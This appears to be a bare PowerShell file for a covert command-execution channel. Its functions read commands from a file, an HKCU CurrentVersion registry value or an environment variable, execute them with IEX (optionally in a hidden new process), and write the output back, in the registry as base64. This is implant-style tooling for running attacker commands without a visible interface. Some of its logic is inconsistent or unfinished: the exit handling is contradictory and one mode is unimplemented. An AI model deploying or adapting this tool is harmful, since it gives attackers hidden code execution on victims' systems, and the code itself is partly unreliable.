
function Loop-Exec(){
    param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("File", "Reg", "Env", "Random")]
        $ExecType,
        [Parameter(Mandatory=$true)]
        $SrcObj,
        [Parameter(Mandatory=$true)]
        $DstObj,
        [ValidateRange(1,10)]
        [Int]
        $interval = 2,
        [String]
        $exitFlag = "exit"
    )
    if($ExecType -eq "File"){
        exec-file -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
    } elseif($ExecType -eq "Env"){
        exec-env -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
    } elseif($ExecType -eq "Reg"){
        exec-registry -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
    }
    if($Global:Flag){ return } else { Sleep $interval }
}

function exec-file(){
    param(
        [Parameter(Mandatory=$true)]
        $SrcObj,
        [Parameter(Mandatory=$true)]
        $DstObj,
        [String]
        $exitFlag = "exit",
        $isNewProcess = $false
    )
    if(Test-Path $SrcObj){
        cat $SrcObj | sv com
        if($com -eq $exitFlag){
            $Global:Flag = $true
        } else {
            if($isNewProcess){
                $env:tmpcom = $com
                $env:tmpout = $DstObj
                Start-Process powershell.exe -NoNewWindow -ArgumentList '-c "$res= IEX($env:tmpcom); echo $res > $env:tmpout"'
                Remove-Item Env:tmpcom
                Remove-Item Env:tmpout
            } else {
                $res= IEX($com); echo $res > $DstObj
            }
            $Global:Flag = $false
        }
    }
}

function exec-registry(){
    param(
        [Parameter(Mandatory=$true)]
        $SrcObj,
        [Parameter(Mandatory=$true)]
        $DstObj,
        [String]
        $exitFlag = "exit",
        $isNewProcess = $false,
        [String]
        $cmdPath = "HKCU:Software\Microsoft\Windows\CurrentVersion"
    )
    if(Test-Path $cmdPath){
        $pathInfo = Get-ItemProperty $cmdPath
        $com = $pathInfo.$SrcObj
        if($com -eq $null){
            return
        } elseif($com -eq $exitFlag){
            $Global:Flag = $false
        } else {
            if($isNewProcess){
                $env:tmpcom = $com
                $env:tmpout = $DstObj
                Start-Process powershell.exe -NoNewWindow -ArgumentList '-c "IEX($env:tmpcom) | echo"' | sv res
                Remove-Item Env:tmpcom
                Remove-Item Env:tmpout
            } else {
                $res = IEX($com)
            }
            $bytes = [System.Text.Encoding]::Default.GetBytes($res)
            $b64 = [System.Convert]::ToBase64String($bytes)
            Set-ItemProperty -Path $cmdPath -Name $DstObj -Value $b64
        }
    }
}

function exec-env(){
    param(
        [Parameter(Mandatory=$true)]
        $SrcObj,
        [Parameter(Mandatory=$true)]
        $DstObj,
        [String]
        $exitFlag = "exit",
        $isNewProcess = $false
    )
    if(Test-Path Env:$SrcObj){
        $com = [Environment]::GetEnvironmentVariable($SrcObj)
        if($com -eq $exitFlag){
            $Global:Flag = $false
        } else {
            if($isNewProcess){
                $env:tmpcom = $com
                $env:tmpout = $DstObj
                Start-Process powershell.exe -NoNewWindow -ArgumentList '-c "IEX($env:tmpcom) | echo"' | sv res
                Remove-Item Env:tmpcom
                Remove-Item Env:tmpout
            } else {
                $res = IEX($com)
            }
            [Environment]::SetEnvironmentVariable($DstObj, $res)
        }
    }
}

